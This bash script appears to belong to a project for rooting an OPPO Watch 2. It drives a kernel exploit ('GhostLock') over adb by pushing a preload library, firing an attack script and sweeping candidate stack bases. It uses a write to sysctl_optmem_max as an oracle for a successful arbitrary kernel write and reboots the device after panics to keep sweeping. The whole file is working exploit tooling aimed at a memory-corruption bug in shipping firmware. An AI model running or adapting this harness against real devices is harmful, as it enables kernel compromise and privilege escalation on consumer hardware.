#!/usr/bin/env bash
# Multi-base W_BASE sweep with the optmem_max positive-write oracle.
# Usage:  bash geo_sweep.sh "<label>" "<START_BASE>" "<BASES_PER_FIRE>"
#
# One fire walks GHOSTLOCK_WBASE_MIN .. +ATTEMPTS-1 stack bases back to back.
# Each base arms rb_erase to store 0 at &sysctl_optmem_max, so:
#   HIT        -> this base is the true reclaimed-stack waiter base
#   panic      -> the fsync'd PRE-PCFI line names the base that died; next fire
#                 resumes one above it (no base is ever re-tested).
# Wrong bases now genuinely get driven (pselect blocks the full timeout and the
# consumer burst performs thousands of sched_setattr PI walks), so a wrong base
# is expected to panic rather than return silently.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
LABEL=${1:-sw}
BASE=${2:-0}
PER=${3:-6}
FIRES=${4:-40}
EXPECT_MD5=${EXPECT_MD5:-be90383ded0a2f0ad204b16e30580093}
SO=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/exploit/preload.so
online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
ensure_so() {
  local dm
  dm=$($ADB shell "md5sum /data/local/tmp/preload.so" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  if [ "$dm" != "$EXPECT_MD5" ]; then
    echo "[$LABEL] device .so md5=$dm != $EXPECT_MD5 -> re-pushing"
    MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" \
      $ADB push "C:/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/exploit/preload.so" \
      /data/local/tmp/preload.so >/dev/null 2>&1
    $ADB shell sync
    dm=$($ADB shell "md5sum /data/local/tmp/preload.so" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
    echo "[$LABEL] after push md5=$dm"
  fi
}
waitdev() { local m=${1:-200} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 3; return 0; }
for i in $(seq 1 $FIRES); do
  waitdev 200 || { echo "[$LABEL] base>=$BASE NO-DEVICE (waiting)"; sleep 30; continue; }
  ov=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
  if [ "$ov" != "10240" ]; then
    echo "[$LABEL] optmem=$ov not pristine -> reboot to reset oracle"
    $ADB shell reboot >/dev/null 2>&1; waitdev 240 || { echo "[$LABEL] NO-RECOVERY"; continue; }
  fi
  $ADB shell "rm -f $DT/log_*.txt; sync" 2>/dev/null
  ensure_so
  echo "[$LABEL] fire#$i bases $BASE..$((BASE+PER-1))  $(date +%H:%M:%S)"
  timeout 300 $ADB shell "GHOSTLOCK_ORACLE=1 GHOSTLOCK_ATTEMPTS=$PER GHOSTLOCK_WBASE_MIN=$BASE sh $DT/fire.sh" >/dev/null 2>&1; rc=$?
  waitdev 200 || { echo "[$LABEL] fire#$i NO-RECOVERY rc=$rc"; continue; }
  ov=$($ADB shell "cat /proc/sys/net/core/optmem_max" 2>/dev/null | tr -d '\r')
  $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/${LABEL}_${BASE}.log"
  L="$ARCH/${LABEL}_${BASE}.log"
  hit=$(grep -o 'ORACLE wbase=[0-9]* .*HIT' "$L" | tail -1)
  last=$(grep -o 'PRE-PCFI a=[0-9]* wbase=[0-9]*' "$L" | tail -1)
  lb=$(echo "$last" | sed -E 's/.*wbase=([0-9]+).*/\1/')
  calls=$(grep -o 'pselect returned attempt=[0-9]* ret=[0-9-]* errno=[0-9]* calls=[0-9]* success=[0-9]*' "$L" | tail -1)
  echo "[$LABEL] fire#$i rc=$rc optmem_after=$ov | $calls | $hit"
  if [ -n "$hit" ] || [ "$ov" = "0" ]; then
    echo ">>> HIT: base carries the waiter  ($hit)  log=$L"; break
  fi
  if [ -z "$lb" ]; then
    echo "[$LABEL] no PRE-PCFI at all (run died before route) rc=$rc; log=$L"; break
  fi
  BASE=$((lb+1))
  if [ $BASE -ge 22 ]; then echo "[$LABEL] exhausted bases 0..21 with no hit"; break; fi
done
echo "[$LABEL] sweep ended at base=$BASE  $(date +%H:%M:%S)"
